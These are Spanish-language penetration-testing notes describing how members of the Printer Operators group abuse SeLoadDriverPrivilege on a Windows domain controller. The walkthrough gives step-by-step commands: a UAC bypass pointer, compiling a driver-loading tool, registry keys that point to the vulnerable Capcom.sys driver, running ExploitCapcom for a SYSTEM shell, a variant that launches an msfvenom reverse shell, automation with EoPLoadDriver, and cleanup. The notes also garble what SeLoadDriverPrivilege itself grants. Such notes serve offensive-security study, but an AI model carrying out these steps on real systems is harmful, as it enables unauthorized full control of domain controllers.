
Otorgo a sus miembro el priv de `SeLoadDrivePrivilege` que son derechos para administrar, crear y eliminar impresoras conectadas a un DC, capacidad para iniciar sesion localmente en un DC y apagarlo

1. Miramos nuestros privs (si SeLoadDrivePrivilege no aparece en un contexto sin privs altos, tendremos que bypassear el UAC)

```
whoami /priv
```
![[Pasted image 20260910211921.png]]

[UACMe](https://github.com/hfiref0x/UACME): lista completa de evasiones UAC

2. En este caso abriremos una terminal con priv administrativos e introduciremos las creds de un Printer Operator. Si miramos los privs otra vez ahora si lo tendremos:

```
whoami /priv
```
![[Pasted image 20260910212051.png]]

3. Podemos cargar el driver `Capcom.sys` que permite ejecutar un shell SYSTEM con cualquier usuario. Usando nuestros altos privs de Printer Operator podemos cargar el driver para escalar privs

[herramienta para cargar el driver](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp)

- Lo descargamos localmente y le añadimos los siguientes includes:

```
#include <windows.h> 
#include <assert.h> 
#include <winternl.h> 
#include <sddl.h> 
#include <stdio.h> 
#include "tchar.h"
```

4. Desde una cmd de VS compilamos usando cl.exe

```
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```
![[Pasted image 20260910212642.png]]

5. Descargamos el drive desde [aquí](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) y lo guardamos en C:\temp. Añadimos una referencia a este dirver bajo el arbol de HKEY_CURRENT_USER

```
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```
![[Pasted image 20260910212754.png]]

	\??\ usada para referenciar el ImagePath de nuestro driver malicioso

6. Verificar que el driver no esta cargado usando [DriverView.exe](http://www.nirsoft.net/utils/driverview.html)

```
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

7. Verificamos que el privilegio esta habilitado

```
EnableSeLoadDriverPrivilege.exe
```
![[Pasted image 20260910212945.png]]

8. Volvemos a verificar pero ahora que el driver si esta cargado

```
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```
![[Pasted image 20260910213036.png]]

9. Usamos la herramienta [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) para escalar privs despues de compilarla en VS. Lanzara una shell con privs SYSTEM

![[Pasted image 20260910213114.png]]
![[Pasted image 20260910213121.png]]


## Explotacion alternativa sin GUI


Tendremos que compilar `ExploitCapcom.cpp` pero cambiando la linea 292 de "C:\\Windows\\system32\\cmd.exe" por un binario de reverse shell creado por msfvenom por ejemplo `c:\ProgramData\revshell.exe`:

![[Pasted image 20260910221733.png]]

Despues en nuestra shell de atacante configuramos un listener basado en el payload de msfvenom con msfconsole. Tras ejecutar ExploitCapcom.exe recibiremos la shell


## Automatizando pasos

[EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) para automatizar el proceso de habilitar el privilegio, crear la hive key y ejecutar NTLoadDriver para cargar el driver:

```
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```
![[Pasted image 20260910221925.png]]

Tras esto ejecutariamos ExploitCapcom.exe para obtener las shell SYSTEM o ejecutar el binario personalizado


## Limpieza

Tenemos que eliminar la hive key que añadimos:

```
reg delete HKCU\System\CurrentControlSet\Capcom
```
![[Pasted image 20260910222023.png]]

	Esto no es explotable desde la version 1803 de Windows10
